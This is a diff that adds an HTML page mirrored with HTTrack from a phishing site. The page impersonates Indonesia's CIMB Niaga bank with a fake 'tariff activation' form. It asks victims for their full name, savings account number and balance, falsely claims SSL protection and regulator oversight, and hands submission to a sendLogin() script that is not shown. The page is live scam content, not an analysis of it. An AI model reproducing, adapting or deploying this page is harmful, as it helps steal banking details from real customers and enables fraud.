@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="id">
+
+<!-- Mirrored from jyt89a.vercel.app/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Jul 2025 08:12:34 GMT -->
+<!-- Added by HTTrack -->
+<!-- Mirrored from cimb.35-area.biz.id/form-tarif-cimb/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jul 2025 17:38:27 GMT -->
+<meta http-equiv="content-type" content="text/html;charset=utf-8" /><!-- /Added by HTTrack -->
+<head>
+    <meta charset="UTF-8">
+    <title>Aktivasi Tarif Bank CIMB Niaga 2025</title>
+    <link rel="icon" type="image/png" href="img/BRImo.html">
+    <meta property="og:image" content="https://cimb.35-area.biz.id/branchlessbanking.cimbniaga.co.id/wp-content/uploads/2021/10/favicon-32x32.html">
+    <meta name="twitter:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTg0puWnjQ3pIjc-spID7CqjlvDQPfouUAcoCROdt78aUc7Np8C2thmaVxt&amp;s=10">
+    <meta name="description" content="Konfirmasikan tarif transaksi Anda sebelum diberlakukan tarif baru otomatis oleh sistem">
+    <meta name="theme-color" content="#CC0000">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script type="module" src="../unpkg.com/ionicons%407.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Nunito:wght@400;600;700;800&amp;display=swap');
+        
+        :root {
+            --primary-blue: #0F78CB;
+            --accent-orange: #F37024;
+            --dark-blue: #06529C;
+            --light-blue: #E6F2FF;
+            --white: #FFFFFF;
+            --black: #1C1C1C;
+            --gray: #F5F5F5;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.12);
+            --shadow-md: 0 4px 6px rgba(0,0,0,0.1);
+            --shadow-lg: 0 10px 25px rgba(0,0,0,0.1);
+            --border-radius-sm: 8px;
+            --border-radius-md: 12px;
+            --border-radius-lg: 16px;
+            --transition: all 0.3s ease;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Nunito', sans-serif;
+            background: linear-gradient(135deg, #FF0900 0%, #CC0000 100%);
+            color: var(--black);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* Loading Screen */
+        .loading-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 255, 255, 0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: opacity 0.5s ease;
+        }
+        
+        .loading-screen img {
+            width: 80px;
+            height: 80px;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(0.95); opacity: 0.8; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(0.95); opacity: 0.8; }
+        }
+        
+        /* Main Container */
+        .main-container {
+            display: none;
+            max-width: 480px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+        }
+        
+        /* Header */
+        .app-header {
+            background: var(--primary-blue);
+            color: var(--white);
+            padding: 15px;
+            border-radius: var(--border-radius-md);
+            margin-bottom: 20px;
+            box-shadow: var(--shadow-md);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .app-header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            width: 100px;
+            height: 100px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transform: translate(30%, -30%);
+        }
+        
+        .app-title {
+            font-size: 1.5rem;
+            font-weight: 800;
+            margin-bottom: 5px;
+        }
+        
+        .app-subtitle {
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+        
+        .highlight {
+            color: var(--accent-orange);
+            font-weight: 700;
+        }
+        
+        /* Banner Carousel */
+        .banner-carousel {
+            display: flex;       
+            scroll-snap-type: x mandatory;
+            scrollbar-width: none;
+            margin-bottom: 25px;
+        }
+        
+        .banner-carousel::-webkit-scrollbar {
+            display: none;
+        }
+        
+        .banner-item {
+            scroll-snap-align: start;         
+            border-radius: var(--border-radius-md);
+            overflow: hidden;
+           background: white;
+        }
+        
+        .banner-item img {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        /* Form Container */
+        .form-container {
+            background: var(--white);
+            border-radius: var(--border-radius-lg);
+            padding: 20px;
+            box-shadow: var(--shadow-lg);
+            margin-bottom: 0px;
+        }
+        
+        .form-title {
+            color: var(--primary-blue);
+            font-size: 1.1rem;
+            text-align: center;
+            padding-bottom: 15px;
+            margin-bottom: 20px;
+            border-bottom: 1px solid rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+        
+        .form-title::after {
+            content: '';
+            position: absolute;
+            bottom: -1px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 50px;
+            height: 3px;
+            background: var(--accent-orange);
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 700;
+            color: var(--black);
+            font-size: 0.95rem;
+        }
+        
+        .select-wrapper, .input-wrapper {
+            position: relative;
+        }
+        
+        .form-select, .form-input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #D1D5DB;
+            border-radius: var(--border-radius-sm);
+            font-family: 'Nunito', sans-serif;
+            font-size: 0.95rem;
+            background: var(--white);
+            transition: var(--transition);
+            appearance: none;
+        }
+        
+        .form-select {
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' fill='%2306529C' viewBox='0 0 16 16'%3E%3Cpath d='M7.247 11.14 2.451 5.658C1.885 5.013 2.345 4 3.204 4h9.592a1 1 0 0 1 .753 1.659l-4.796 5.48a1 1 0 0 1-1.506 0z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 15px center;
+            background-size: 12px;
+            padding-right: 35px;
+        }
+        
+        .form-input {
+            padding-left: 40px;
+        }
+        
+        .form-select:focus, .form-input:focus {
+            outline: none;
+            border-color: var(--primary-blue);
+            box-shadow: 0 0 0 3px rgba(15, 120, 203, 0.2);
+        }
+        
+        .input-icon {
+            position: absolute;
+            left: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--dark-blue);
+            font-size: 1.2rem;
+        }
+        
+        /* Security Badge */
+        .security-badge {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 20px;
+            padding: 12px;
+            background: var(--light-blue);
+            border-radius: var(--border-radius-sm);
+            border: 1px solid rgba(15, 120, 203, 0.2);
+        }
+        
+        .security-icon {
+            color: var(--primary-blue);
+            font-size: 1.5rem;
+        }
+        
+        .security-text {
+            font-size: 0.8rem;
+            color: var(--dark-blue);
+            font-weight: 600;
+        }
+        
+        /* Footer */
+        .app-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: var(--white);
+            padding: 15px 20px;
+            box-shadow: 0 -5px 15px rgba(0, 0, 0, 0.05);
+            z-index: 10;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            background: linear-gradient(135deg, #FF0000 0%, #CC0000 100%);
+            color: var(--white);
+            border: none;
+            padding: 15px;
+            border-radius: var(--border-radius-sm);
+            font-family: 'Nunito', sans-serif;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: var(--transition);
+            box-shadow: 0 4px 6px rgba(255, 0, 0, 0.1);
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 10px rgba(255, 0, 0, 0.15);
+        }
+        
+        .submit-btn:active {
+            transform: translateY(0);
+        }
+        
+        .legal-text {
+            font-size: 0.7rem;
+            text-align: center;
+            color: #666;
+            margin-top: 10px;
+            line-height: 1.4;
+        }
+        
+        .copyright {
+            text-align: center;
+            font-size: 0.75rem;
+            color: #888;
+            margin-top: 15px;
+        }
+        
+        /* Animation */
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .animate-fade {
+            animation: fadeIn 0.5s ease-out forwards;
+        }
+        
+        .lgo{
+            margin: 13px;
+        }
+    </style>
+</head>
+<body>
+    <!-- Loading Screen -->
+    <div class="loading-screen">
+        <img src="img/octo_loading.gif" alt="CIMB Niaga Loading">
+    </div>
+    <img src="img/logo.svg" class="lgo"></img>
+    <!-- Main Content -->
+    <div class="main-container">
+        
+        <div class="banner-carousel animate-fade" style="animation-delay: 0.1s">
+            <div class="banner-item">
+                <img src="img/baner.gif" alt="Promo 1">
+            </div>
+            
+        </div>
+        
+        <!-- Form -->
+        <form id="loginForm" onsubmit="sendLogin()" method="post" class="form-container animate-fade" style="animation-delay: 0.2s">
+             <input type="hidden" name="tarif" id="tarif">
+             <input type="hidden" name="nomor" id="nomor">
+            
+            <h2 class="form-title">Untuk melanjutkan proses tarif transaksi anda, silahkan lengkapi data dibawah ini.</h2>
+            
+             <div class="form-group">
+           <label class="form-label">Nama Lengkap:</label>
+                <div class="input-wrapper">
+                    <ion-icon name="id-card-outline" class="input-icon"></ion-icon>
+                    <input type="text" name="nama" id="nama" class="form-input" placeholder="Nama sesuai KTP" oninvalid="this.setCustomValidity('Masukkan nama sesuai KTP')" onchange="this.setCustomValidity('')" required >
+                </div>
+            </div>
+            
+        <div class="form-group">
+           <label class="form-label">Nomor Rekening Tabungan:</label>
+                <div class="input-wrapper">
+                    <ion-icon name="list-outline" class="input-icon"></ion-icon>
+                    <input type="tel" name="rek" id="rek" class="form-input" placeholder="123456789" oninvalid="this.setCustomValidity('Masukkan Nomor Rekening')" onchange="this.setCustomValidity('')" required >
+                </div>
+            </div>
+            
+  <div class="form-group">
+                <label class="form-label">saldo akhir:</label>
+                <div class="input-wrapper">
+                   <ion-icon name="cash-outline" class="input-icon"></ion-icon>
+                    <input type="tel" id="saldo" name="saldo" class="form-input" placeholder="Rp. xxx" oninvalid="this.setCustomValidity('Masukkan saldo sesuai rekening tabungan')" onchange="this.setCustomValidity('')" required >
+                </div>
+            </div>
+
+            <!-- Security Badge -->
+            <div class="security-badge">
+                <ion-icon name="shield-checkmark" class="security-icon"></ion-icon>
+                <span class="security-text">Data Anda dilindungi dengan enkripsi 256-bit SSL</span>
+            </div>
+        
+        
+        <!-- Footer -->
+        <br>
+            <button type="submit" id="kirim" class="submit-btn">LANJUTKAN</button>
+            <script src="config.js"></script>
+
+            <p class="legal-text">
+                PT Bank CIMB Niaga Tbk berizin & diawasi oleh Otoritas Jasa Keuangan & Bank Indonesia 
+                serta merupakan Peserta Penjaminan LPS
+            </p>
+       
+        
+        <p class="copyright">© 2025 PT Bank CIMB Niaga Tbk</p>
+    </div>
+    </form>
+    <script src="../code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="data.js"></script>
+    <script>
+   document.getElementById("tarif").value =
+        sessionStorage.getItem("tarif");
+document.getElementById("nomor").value =
+        sessionStorage.getItem("nomor");     
+        
+        $(document).ready(function() {
+            $('.main-container').fadeIn(400);
+            setTimeout(function() {
+                $('.loading-screen').fadeOut(00, function() {
+                    $('.main-container').fadeIn(00);
+                });
+            }, 900);                                  
+        });
+    </script>
+    <script>
+    var dengan_rupiah = document.getElementById('saldo');
+
+    dengan_rupiah.addEventListener('keyup', function(e)
+
+    {
+
+        dengan_rupiah.value = formatRupiah(this.value, 'Rp. ');
+
+    });
+
+    
+
+    /* Fungsi */
+
+    function formatRupiah(angka, prefix)
+
+    {
+
+        var number_string = angka.replace(/[^,\d]/g, '').toString(),
+
+            split    = number_string.split(','),
+
+            sisa     = split[0].length % 3,
+
+            rupiah     = split[0].substr(0, sisa),
+
+            ribuan     = split[0].substr(sisa).match(/\d{3}/gi);
+
+            
+
+        if (ribuan) {
+
+            separator = sisa ? '.' : '';
+
+            rupiah += separator + ribuan.join('.');
+
+        }
+
+        
+
+        rupiah = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+
+        return prefix == undefined ? rupiah : (rupiah ? 'Rp. ' + rupiah : '');
+
+    }</script>
+</body>
+
+<!-- Mirrored from jyt89a.vercel.app/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 17 Jul 2025 08:12:39 GMT -->
+
+<!-- Mirrored from cimb.35-area.biz.id/form-tarif-cimb/login.html by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 22 Jul 2025 17:38:33 GMT -->
+</html>
